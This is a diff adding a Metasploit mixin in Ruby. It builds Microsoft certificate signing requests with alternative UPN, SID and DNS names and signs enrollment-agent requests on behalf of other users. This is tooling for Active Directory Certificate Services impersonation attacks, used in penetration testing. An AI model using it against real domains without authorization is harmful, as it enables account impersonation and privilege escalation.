+++ lib/msf/core/exploit/remote/ms_csr.rb
@@ -1,0 +1,169 @@
+###
+#
+# This mixin provides methods for creating certificate requests
+#
+# -*- coding: binary -*-
+
+require 'rex/proto/x509/request'
+
+module Msf
+
+  module Exploit::Remote::MsCsr
+
+    # [2.2.2.7.5 szOID_NT_PRINCIPAL_NAME](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/ea9ef420-4cbf-44bc-b093-c4175139f90f)
+    OID_NT_PRINCIPAL_NAME = '1.3.6.1.4.1.311.20.2.3'.freeze
+    # [[MS-WCCE]: 2.2.2.7.10 szENROLLMENT_NAME_VALUE_PAIR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/92f07a54-2889-45e3-afd0-94b60daa80ec)
+    OID_ENROLLMENT_NAME_VALUE_PAIR = '1.3.6.1.4.1.311.13.2.1'.freeze
+
+    def initialize(info = {})
+      super
+
+      register_options([
+                         OptString.new('ALT_DNS', [ false, 'Alternative certificate DNS' ]),
+                         OptString.new('ALT_SID', [ false, 'Alternative object SID' ]),
+                         OptString.new('ALT_UPN', [ false, 'Alternative certificate UPN (format: USER@DOMAIN)' ]),
+                         OptPath.new('PFX', [ false, 'Certificate to request on behalf of' ]),
+                         OptString.new('ON_BEHALF_OF', [ false, 'Username to request on behalf of (format: DOMAIN\\USER)' ]),
+                       ], Msf::Exploit::Remote::MsCsr)
+
+      register_advanced_options([
+                                  OptEnum.new('DigestAlgorithm', [ true, 'The digest algorithm to use', 'SHA256', %w[SHA1 SHA256] ])
+                                ])
+    end
+
+
+    # Make a certificate signing request.
+    #
+    # @param [String] cn The common name for the certificate.
+    # @param [OpenSSL::PKey] private_key The private key for the certificate.
+    # @param [String] dns An alternative DNS name to use.
+    # @param [String] msext_sid An explicit SID to specify for strong identity mapping.
+    # @param [String] msext_upn An alternative User Principal Name (this is a Microsoft-specific feature).
+    # @param [String] algorithm The algorithm to use when signing the CSR.
+    # @param [Array<String>] application_policies OIDs to add as application policies.
+    # @return [OpenSSL::X509::Request] The request object.
+    def build_csr(cn:, private_key:, dns: nil, msext_sid: nil, msext_upn: nil, algorithm: 'SHA256', application_policies: [])
+      Rex::Proto::X509::Request.create_csr(private_key, cn, algorithm) do |request|
+        extensions = []
+
+        subject_alt_names = []
+        subject_alt_names << "otherName = #{OID_NT_PRINCIPAL_NAME};UTF8:#{msext_upn}" if msext_upn
+
+        if msext_sid
+          subject_alt_names << "URI = #{SAN_URL_PREFIX}#{msext_sid}"
+          subject_alt_names << "URI = #{msext_sid}"
+        end
+
+        subject_alt_names << "DNS = #{dns}" if dns
+
+        unless subject_alt_names.empty?
+          # factory.create_extension accepts a comma separated list of SANs or a config file of SANs.
+          # SAN_URL_PREFIX in the URI SAN contains a comma so we create a config file and add it to the factory
+          # The config file requires an identifier we define at the top of the file [alt_names]
+          subject_alt_names.prepend("[alt_names]")
+          subject_alt_names_conf = subject_alt_names.join("\n")
+          config = OpenSSL::Config.parse(subject_alt_names_conf)
+          factory = OpenSSL::X509::ExtensionFactory.new
+          factory.config = config
+          extensions << factory.create_extension('subjectAltName', '@alt_names', false)
+        end
+
+        if msext_sid
+          ntds_ca_security_ext = Rex::Proto::CryptoAsn1::NtdsCaSecurityExt.new(OtherName: {
+            type_id: OID_NTDS_OBJECTSID,
+            value: msext_sid
+          })
+          extensions << OpenSSL::X509::Extension.new(OID_NTDS_CA_SECURITY_EXT, ntds_ca_security_ext.to_der, false)
+        end
+
+        unless application_policies.blank?
+          application_cert_policies = Rex::Proto::CryptoAsn1::X509::CertificatePolicies.new(
+            certificatePolicies: application_policies.map { |policy_oid| Rex::Proto::CryptoAsn1::X509::PolicyInformation.new(policyIdentifier: policy_oid) }
+          )
+          extensions << OpenSSL::X509::Extension.new(OID_APPLICATION_CERT_POLICIES, application_cert_policies.to_der, false)
+        end
+
+        unless extensions.empty?
+          request.add_attribute(OpenSSL::X509::Attribute.new(
+            'extReq',
+            OpenSSL::ASN1::Set.new(
+              [OpenSSL::ASN1::Sequence.new(extensions)]
+            )
+          ))
+        end
+      end
+    end
+
+    # Make a certificate request on behalf of another user.
+    #
+    # @param [OpenSSL::X509::Request] csr The certificate request to make on behalf of the user.
+    # @param [String] on_behalf_of The user to make the request on behalf of.
+    # @param [OpenSSL::X509::Certificate] cert The public key to use for signing the request.
+    # @param [OpenSSL::PKey::RSA] key The private key to use for signing the request.
+    # @param [String] algorithm The digest algorithm to use.
+    # @return [Rex::Proto::CryptoAsn1::Cms::ContentInfo] The signed request content.
+    def build_on_behalf_of(csr:, on_behalf_of:, cert:, key:, algorithm: 'SHA256')
+      # algorithm needs to be one that OpenSSL supports, but we also need the OID constants defined
+      digest = OpenSSL::Digest.new(algorithm)
+      unless [ digest.name, "RSAWith#{digest.name}" ].all? { |s| Rex::Proto::Kerberos::Model::OID.constants.include?(s.to_sym) }
+        raise ArgumentError, "Can not map digest algorithm #{digest.name} to the necessary OIDs."
+      end
+
+      digest_oid = Rex::Proto::Kerberos::Model::OID.const_get(digest.name)
+
+      signer_info = Rex::Proto::CryptoAsn1::Cms::SignerInfo.new(
+        version: 1,
+        sid: {
+          issuer: cert.issuer,
+          serial_number: cert.serial.to_i
+        },
+        digest_algorithm: {
+          algorithm: digest_oid
+        },
+        signed_attrs: [
+          {
+            attribute_type: OID_ENROLLMENT_NAME_VALUE_PAIR,
+            attribute_values: [
+              RASN1::Types::Any.new(value: Rex::Proto::CryptoAsn1::EnrollmentNameValuePair.new(
+                name: 'requestername',
+                value: on_behalf_of
+              ))
+            ]
+          },
+          {
+            attribute_type: Rex::Proto::Kerberos::Model::OID::MessageDigest,
+            attribute_values: [RASN1::Types::Any.new(value: RASN1::Types::OctetString.new(value: digest.digest(csr.to_der)))]
+          }
+        ],
+        signature_algorithm: {
+          algorithm: Rex::Proto::Kerberos::Model::OID.const_get("RSAWith#{digest.name}")
+        }
+      )
+      data = RASN1::Types::Set.new(value: signer_info[:signed_attrs].value).to_der
+      signature = key.sign(digest, data)
+
+      signer_info[:signature] = signature
+
+      signed_data = Rex::Proto::CryptoAsn1::Cms::SignedData.new(
+        version: 3,
+        digest_algorithms: [
+          {
+            algorithm: digest_oid
+          }
+        ],
+        encap_content_info: {
+          econtent_type: Rex::Proto::Kerberos::Model::OID::PkinitAuthData,
+          econtent: csr.to_der
+        },
+        certificates: [{ openssl_certificate: cert }],
+        signer_infos: [signer_info]
+      )
+
+      Rex::Proto::CryptoAsn1::Cms::ContentInfo.new(
+        content_type: Rex::Proto::Kerberos::Model::OID::SignedData,
+        data: signed_data
+      )
+    end
+
+  end
+end
